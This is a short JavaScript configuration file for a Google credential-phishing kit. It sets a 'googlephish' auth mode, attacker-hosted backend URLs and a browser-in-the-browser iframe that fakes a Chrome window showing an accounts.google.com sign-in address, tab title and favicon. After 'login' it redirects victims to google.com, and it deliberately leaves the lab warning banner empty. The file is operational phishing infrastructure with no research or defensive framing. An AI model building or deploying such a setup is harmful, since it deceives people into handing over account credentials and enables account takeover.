window.APP_CONFIG = {
    authMode: 'googlephish',

    apiBaseUrl: 'https://tk-ap.onrender.com',
    googleClientId: '735055798027-6jjv31ohc5eg03olqn9i8tvav311j34l.apps.googleusercontent.com',
    authPollIntervalMs: 1500,
    authPollMaxMs: 3 * 60 * 1000,
    afterLoginRedirectUrl: 'https://www.google.com',
    afterLoginRedirectDelayMs: 0,

    // PHP backend URL (no trailing slash). Run: cd googlephish && php -S 127.0.0.1:8080
    googlephishBaseUrl: 'http://tk-ap-1.onrender.com',

    // First page the BITB iframe loads
    bitbEntryPath: '/index.php',

    // What shows in the Chrome address bar
    bitbDisplayUrl:
        'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1:1234567890',

    // Chrome tab title
    bitbTabTitle: 'Sign in - Google Accounts',

    // Chrome tab favicon
    bitbFaviconUrl: 'https://www.google.com/favicon.ico',

    // Leave empty — no extra banner in the title bar
    bitbLabLabel: ''
};
